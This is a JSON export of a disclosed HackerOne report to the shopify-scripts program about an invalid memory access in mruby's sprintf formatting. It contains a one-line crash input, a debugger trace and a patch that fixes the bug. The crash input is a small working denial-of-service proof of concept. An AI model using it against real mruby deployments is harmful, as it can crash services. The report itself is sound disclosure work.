{
  "id": 191328,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTEzMjg=",
  "url": "https://hackerone.com/reports/191328",
  "title": "Invalid memory access in `mrb_str_format`",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "none",
  "readable_substate": "Resolved",
  "created_at": "2016-12-15T07:52:31.565Z",
  "submitted_at": "2016-12-15T07:52:31.565Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "haquaman",
    "url": "/haquaman",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-01-11T17:52:03.585Z",
  "bug_reporter_agreed_on_going_public_at": "2017-01-11T17:52:03.550Z",
  "team_member_agreed_on_going_public_at": "2017-01-11T16:24:30.341Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Only affects `mruby` because `mruby-engine` doesn't have sprintf. I should have filed this last friday before I went to the pub, so missed out on higher bounties. Oh well!\n\nCrash file is:\n\n```\nsprintf(\"%1$*c\", 0)\n```\n\nCrash is:\n\n```\n$ lldb ./bin/mruby ../crash.rb\n(lldb) target create \"./bin/mruby\"\nCurrent executable set to './bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"../crash.rb\"\n(lldb) r\nProcess 69381 launched: './bin/mruby' (x86_64)\nProcess 69381 stopped\n* thread #1: tid = 0x1d8935, 0x00007fff9969ec49 libsystem_platform.dylib`_platform_bzero$VARIANT$Haswell + 41, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x100700000)\n    frame #0: 0x00007fff9969ec49 libsystem_platform.dylib`_platform_bzero$VARIANT$Haswell + 41\nlibsystem_platform.dylib`_platform_bzero$VARIANT$Haswell:\n->  0x7fff9969ec49 <+41>: rep\n    0x7fff9969ec4a <+42>: stosb  %al, %es:(%rdi)\n    0x7fff9969ec4b <+43>: movq   %rdx, %rax\n    0x7fff9969ec4e <+46>: popq   %rbp\n(lldb) up\nframe #1: 0x00007fff96fbfa6b libsystem_c.dylib`__memset_chk + 22\nlibsystem_c.dylib`__memset_chk:\n    0x7fff96fbfa6b <+22>: movq   %rbx, %rax\n    0x7fff96fbfa6e <+25>: addq   $0x8, %rsp\n    0x7fff96fbfa72 <+29>: popq   %rbx\n    0x7fff96fbfa73 <+30>: popq   %rbp\n(lldb) up\nframe #2: 0x000000010004a155 mruby`mrb_str_format(mrb=0x0000000100300390, argc=2, argv=0x000000010100f020, fmt=mrb_value @ 0x00007fff5fbfc800) + 11829 at sprintf.c:693\n   690            FILL(' ', width-1);\n   691          }\n   692          else {\n-> 693            FILL(' ', width-1);\n   694            CHECK(n);\n   695            memcpy(buf+blen, c, n);\n   696            blen += n;\n(lldb) p width\n(mrb_int) $0 = 0\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n```\n\nHappens you have a positional width parameter passed to sprintf, with an argument of 0. \n\nA patch to fix is:\n\n```\ndiff --git a/mrbgems/mruby-sprintf/src/sprintf.c b/mrbgems/mruby-sprintf/src/sprintf.c\nindex 696d093..8ed8b92 100644\n--- a/mrbgems/mruby-sprintf/src/sprintf.c\n+++ b/mrbgems/mruby-sprintf/src/sprintf.c\n@@ -618,8 +618,8 @@ retry:\n \n       case '*':\n         CHECK_FOR_WIDTH(flags);\n-        flags |= FWIDTH;\n         GETASTER(width);\n+        flags |= FWIDTH;\n         if (width < 0) {\n           flags |= FMINUS;\n           width = -width;\n```\n\nCheers,\n\nHugh",
  "bounty_amount": "100.0",
  "formatted_bounty": "$100",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-02-10T16:24:30.383Z",
  "allow_singular_disclosure_after": -221083533.58761758,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "eveeez",
    "zig_shark",
    "spetr0x",
    "massiladj"
  ],
  "severity": {
    "rating": "none",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
